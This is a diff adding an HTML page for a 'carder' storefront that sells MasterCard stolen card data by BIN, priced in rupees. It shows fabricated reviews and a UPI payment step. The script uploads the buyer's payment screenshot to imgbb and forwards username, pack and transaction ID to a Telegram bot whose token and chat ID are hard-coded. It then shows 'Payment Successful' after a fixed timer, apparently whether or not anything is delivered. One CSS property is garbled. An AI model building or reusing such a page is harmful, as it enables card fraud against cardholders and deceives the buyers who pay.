@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Russian Gamer</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
+
+/* BACKGROUND */
+body{
+background:linear-gradient(135deg,#020617,#000,#020617);
+color:#fff;
+overflow-x:hidden;
+}
+
+/* HEADER */
+.header{
+padding:16px;
+text-align:center;
+font-weight:700;
+backgRUSSIANround:#020617;
+position:sticky;
+top:0;
+z-index:10;
+letter-spacing:1px;
+box-shadow:0 0 15px #22c55e33;
+}
+.menu-btn{
+position:absolute;
+right:15px;
+top:15px;
+font-size:22px;
+cursor:pointer;
+}
+
+/* OVERLAY */
+.overlay{
+position:fixed;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.7);
+display:none;
+z-index:90;
+}
+.overlay.active{display:block}
+
+/* MENU */
+.menu{
+position:fixed;
+right:-260px;
+top:0;
+width:260px;
+height:100%;
+background:#020617;
+padding:20px;
+transition:.3s;
+z-index:100;
+border-left:1px solid #22c55e55;
+}
+.menu.active{right:0}
+.menu h3{color:#4ade80;margin-bottom:10px}
+.menu div{
+background:#1e293b;
+padding:12px;
+border-radius:10px;
+margin-top:8px;
+cursor:pointer;
+transition:.2s;
+}
+.menu div:hover{
+background:#22c55e;
+color:#000;
+}
+
+/* PAGE */
+.page{
+display:none;
+padding:20px;
+animation:fade .4s;
+}
+.page.active{display:block}
+@keyframes fade{
+from{opacity:0;transform:translateY(10px)}
+to{opacity:1;transform:translateY(0)}
+}
+
+/* CARD */
+.card{
+background:rgba(15,23,42,0.9);
+padding:18px;
+border-radius:14px;
+box-shadow:0 0 25px #22c55e33;
+backdrop-filter:blur(10px);
+animation:pop .3s;
+}
+@keyframes pop{
+from{transform:scale(.95);opacity:.5}
+to{transform:scale(1);opacity:1}
+}
+
+/* INPUT */
+input{
+width:100%;
+padding:14px;
+margin-top:10px;
+border:none;
+border-radius:10px;
+background:#020617;
+color:white;
+transition:.2s;
+}
+input:focus{
+outline:none;
+box-shadow:0 0 12px #22c55e;
+}
+
+/* BUTTON */
+button{
+width:100%;
+padding:14px;
+margin-top:12px;
+border:none;
+border-radius:10px;
+background:linear-gradient(90deg,#22c55e,#4ade80);
+font-weight:bold;
+cursor:pointer;
+transition:.2s;
+}
+button:hover{box-shadow:0 0 15px #22c55e}
+button:active{transform:scale(.96)}
+
+/* ITEMS */
+.items{
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:12px;
+margin-top:15px;
+}
+.item{
+background:#0f172a;
+padding:10px;
+border-radius:12px;
+text-align:center;
+box-shadow:0 0 15px #22c55e22;
+transition:.3s;
+}
+.item:hover{
+transform:translateY(-4px);
+box-shadow:0 0 25px #22c55e55;
+}
+.price{color:#4ade80}
+
+/* REVIEW */
+.review{
+background:#0f172a;
+padding:10px;
+margin-top:8px;
+border-radius:10px;
+color:#cbd5f5;
+}
+
+/* PAYMENT NOTICE */
+.notice{
+margin-top:10px;
+padding:10px;
+border-radius:10px;
+background:#220000;
+color:#ff4d4d;
+font-size:14px;
+text-align:center;
+box-shadow:0 0 10px #ff000055;
+}
+
+/* LOADER */
+.loader{
+width:60px;height:60px;
+border:6px solid #0f172a;
+border-top:6px solid #22c55e;
+border-radius:50%;
+animation:spin 1s linear infinite;
+margin:auto;
+}
+@keyframes spin{100%{transform:rotate(360deg)}}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+ INDIAN CARDER
+<div class="menu-btn" onclick="toggleMenu()">⋮</div>
+</div>
+
+<div class="overlay" id="overlay" onclick="closeMenu()"></div>
+
+<div class="menu" id="menu">
+<h3 id="userDisplay"></h3>
+<div onclick="go('help')">Customer Help</div>
+<div onclick="go('paymentmethod')">Payment Method</div>
+<div onclick="go('purchased')">Purchased Codes</div>
+</div>
+
+<!-- LOGIN -->
+<div class="page active" id="login">
+<div class="card">
+<h2>Welcome 👋</h2>
+<input id="username" placeholder="Enter Telegram Username">
+<button onclick="login()">Continue</button>
+</div>
+</div>
+
+<!-- GAME CODE -->
+<div class="page" id="gamecode">
+<h2 id="welcomeText"></h2>
+<div class="card">
+<input placeholder="Enter BIN or App Name">
+<button onclick="go('items')">Continue</button>
+</div>
+</div>
+
+<!-- ITEMS -->
+<div class="page" id="items">
+<h2>MasterCard CCs For Your BIN Or App</h2>
+
+<div class="items">
+<div class="item"><img src="https://i.ibb.co/wNdhwdBt/IMG-20260426-153333.jpg" width="100%"><p>₹1000 (Demo 1x Only)</p><p class="price">₹100</p><button onclick="buy('1000 - ₹200')">Buy</button></div>
+<div class="item"><img src="https://i.ibb.co/wNdhwdBt/IMG-20260426-153333.jpg" width="100%"><p>₹3000</p><p class="price">₹500</p><button onclick="buy('3000 - ₹500')">Buy</button></div>
+<div class="item"><img src="https://i.ibb.co/wNdhwdBt/IMG-20260426-153333.jpg" width="100%"><p>₹5000</p><p class="price">₹2400</p><button onclick="buy('5000 - ₹2400')">Buy</button></div>
+<div class="item"><img src="https://i.ibb.co/wNdhwdBt/IMG-20260426-153333.jpg" width="100%"><p>₹8000</p><p class="price">₹3080</p><button onclick="buy('8000 - ₹3080')">Buy</button></div>
+<div class="item"><img src="https://i.ibb.co/wNdhwdBt/IMG-20260426-153333.jpg" width="100%"><p>₹10000</p><p class="price">₹4500</p><button onclick="buy('10000 - ₹4500')">Buy</button></div>
+<div class="item"><img src="https://i.ibb.co/wNdhwdBt/IMG-20260426-153333.jpg" width="100%"><p>₹15000</p><p class="price">₹7800</p><button onclick="buy('15000 - ₹7800')">Buy</button></div>
+</div>
+
+<h3 style="margin-top:15px">Reviews</h3>
+<div class="review"> ha bhai legit hai</div>
+<div class="review"> Instant delivery mila nice and working</div>
+<div class="review"> Trusted site always</div>
+
+</div>
+
+<!-- CONFIRM -->
+<div class="page" id="confirm">
+<div class="card">
+<h2>Confirm Purchase</h2>
+<p id="confirmText"></p>
+<button onclick="go('payment')">Proceed</button>
+</div>
+</div>
+
+<!-- PAYMENT -->
+<div class="page" id="payment">
+<div class="card">
+<h2>UPI Payment</h2>
+<p id="selected"></p>
+
+<img src="https://i.ibb.co/0ydx97zN/20260426-152144.jpg" width="100%">
+
+<div class="notice">
+⚠ Screenshot is MANDATORY for verification
+</div>
+
+<input type="file" id="ss">
+<input id="txn" placeholder="TXN ID (optional)">
+
+<button onclick="process()">Confirm Payment</button>
+</div>
+</div>
+
+<!-- PROCESS -->
+<div class="page" id="process">
+<div class="loader"></div>
+<h2 style="text-align:center;margin-top:10px">Processing Payment...</h2>
+</div>
+
+<!-- FINAL -->
+<div class="page" id="final">
+<div class="card" style="text-align:center">
+<h2>Payment Successful ✅</h2>
+<p>If payment was valid, code sent to:</p>
+<h3 id="finalUser"></h3>
+<p>Check your Telegram</p>
+</div>
+</div>
+
+<script>
+let username="",selectedPack="";
+
+function login(){
+username=document.getElementById("username").value;
+if(!username)return alert("Enter username");
+userDisplay.innerText=username;
+welcomeText.innerText="Welcome, "+username;
+go("gamecode");
+}
+
+function go(id){
+document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
+document.getElementById(id).classList.add("active");
+closeMenu();
+}
+
+function toggleMenu(){
+menu.classList.toggle("active");
+overlay.classList.toggle("active");
+}
+function closeMenu(){
+menu.classList.remove("active");
+overlay.classList.remove("active");
+}
+
+function buy(p){
+selectedPack=p;
+confirmText.innerText=p;
+selected.innerText=p;
+go("confirm");
+}
+
+function process(){
+let file=document.getElementById("ss").files[0];
+let txn=document.getElementById("txn").value;
+if(!file)return alert("Screenshot is required!");
+
+let reader=new FileReader();
+reader.onload=function(){
+let base64=reader.result.split(",")[1];
+
+fetch("https://api.imgbb.com/1/upload?key=04499369cd53cbad7492fefab2036307",{
+method:"POST",
+body:new URLSearchParams({image:base64})
+})
+.then(res=>res.json())
+.then(data=>{
+
+fetch("https://api.telegram.org/bot8625358689:AAFmEDHpKnfb2pSP8dvCtYmAkI8iEDPiIRs/sendMessage",{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({
+chat_id:"8716201382",
+text:`User: ${username}\nPack: ${selectedPack}\nTXN: ${txn}\n${data.data.url}`
+})
+});
+
+go("process");
+
+setTimeout(()=>{
+finalUser.innerText=username;
+go("final");
+},3000);
+
+});
+};
+reader.readAsDataURL(file);
+}
+</script>
+
+</body>
+</html>
